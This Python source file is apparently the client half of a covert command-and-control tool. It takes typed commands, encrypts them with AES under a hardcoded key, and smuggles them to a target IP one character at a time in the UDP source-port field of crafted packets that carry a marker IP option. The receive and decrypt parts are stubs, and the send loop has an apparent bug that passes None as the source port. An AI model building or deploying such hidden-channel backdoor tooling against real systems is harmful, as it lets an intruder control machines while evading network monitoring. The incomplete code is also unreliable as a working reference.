from threading import Thread
import time
import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.layers.inet import UDP, IP
from scapy.all import sniff, send
from multiprocessing import Process

class Client:
    def __init__(self, ip: str):
        print(f"Client has been initiated.\nTarget: {ip}")
        self.target_ip = ip
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag = [('flag', b'\x60\x60\x60')]

    def start(self):
        self.create_process()
        self.get_input()

    def get_input(self):
        while True:
            cmd = input("Enter command:")
            print(cmd)
            msg = self.prepare_msg(cmd)
            self.craft_packet(msg)


    def prepare_msg(self, cmd):
        cipher = self.generate_cipher()
        encrypted_data = self.encrypt_data(cipher, cmd)
        print(f"Encrypted format: {encrypted_data}")
        hex_str = self.get_hex_string(encrypted_data)
        print("--------------------------------------------------------------")
        # Convert byte stream of encrypted line to hex string
        for char in hex_str:
            # for each char in string,
            # get ascii code and generate packet
            ascii_data = self.get_ascii(char)
            self.craft_packet(ascii_data)
        # Send terminator to signal end of str
        terminator = self.get_ascii("|")
        self.craft_packet(terminator)

    def create_process(self):
        x = Process(target=self.sniff_init)
        x.start()
    def sniff_init(self):
        try:
            sniff(filter="udp", prn=lambda p: self.process_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def process_packets(self, packet):
        pass

    def craft_packet(self, input: str):
        ip = IP(options=self.flag, dst=self.target_ip)
        udp = UDP(sport=input)
        payload = "******"
        pkt = ip / udp / payload
        try:
            send(pkt, verbose=0)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def decrypt_msg(self):
        """Decrypts hex string"""
        print("Received entire message..... combining pieces\n")
        # encrypted_string = bytes.fromhex(hex_data)
        # self.reset_hex()
        # print(f"Combined byte stream of encrypted message: {encrypted_string}")
        # cipher = self.generate_cipher()
        # # Initialize a decryptor object
        # decryptor = cipher.decryptor()
        # # Initialize an unpadder object
        # unpadder = padding.PKCS7(128).unpadder()
        # # Decrypt and remove padding
        # padded_message = decryptor.update(encrypted_string) + decryptor.finalize()
        # msg = unpadder.update(padded_message) + unpadder.finalize()
        # msg = msg.decode()
        # print(f"Decrypted message: {msg}\n")
        pass

    def get_hex_string(self, encrypted_line):
        """ Returns hex string of byte stream (encrypted string)"""
        return encrypted_line.hex()

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))

    def encrypt_data(self, cipher, line) -> bytes:
        """Encrypts message"""
        encryptor = cipher.encryptor()
        # Padding needed at AES requires specific byte size.
        # Allows for custom length messages.
        padder = padding.PKCS7(128).padder()
        padded_line = padder.update(line.encode()) + padder.finalize()
        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
        return encrypted_line

    def get_ascii(self, hex_char) -> int:
        """Returns ascii code of char"""
        return ord(hex_char)

    def get_char(self, ascii) -> chr:
        """Gets char from ascii code"""
        return chr(ascii)


#https://stackoverflow.com/questions/14300245/python-console-application-output-above-input-line/71087379#71087379


# def thread_test():
#     time.sleep(2)
#     # os.system('cls' if os.name == 'nt' else "printf '\033c'")
#     msg = "adawdawd"
#     print(f"\u001B[s\u001B[A\u001B[999D\u001B[S\u001B[L{msg}\u001B[u", end="", flush=True)
#
#
#
#
# X = Thread(target=thread_test)
# X.start()
# while True:
#     name = input("Enter commands.....:")
#     print(name)
#
#



